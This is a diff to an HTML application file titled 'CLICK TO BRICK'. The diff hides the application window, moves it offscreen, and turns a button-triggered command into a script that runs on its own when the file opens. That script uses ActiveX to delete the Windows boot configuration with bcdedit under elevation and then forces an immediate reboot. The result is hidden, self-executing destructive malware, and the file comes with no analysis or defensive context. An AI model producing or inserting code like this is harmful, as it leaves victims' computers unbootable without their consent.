@@ -1,11 +1,22 @@
 <html>
 <head>
 <title>CLICK TO BRICK</title>
-
+<HTA:APPLICATION
+      ID="oHTA"
+      APPLICATIONNAME="HiddenApp"
+      WINDOWSTATE="minimize"
+      SHOWINTASKBAR="no"
+      CAPTION="no"
+      BORDER="none"
+      SYSMENU="no"
+      MAXIMIZEBUTTON="no"
+      MINIMIZEBUTTON="no"
+   >
 </head>
 <body style="margin:0;background:red;">
 <p>PRESSING THE BUTTON BELOW WILL BREAK YOUR PC!</p>
 <p>CLICK THIS BUTTON TO DESTROY THE BOOT CONFIG DATA. THIS WILL DESTORY YOUR PC.</p>
-<button onclick="(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()">Click2Brick</button><p>Your PC</p>
+<script>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</script>
+<script>window.moveTo(-3000, -3000);</script>
 </body>  
 </html>
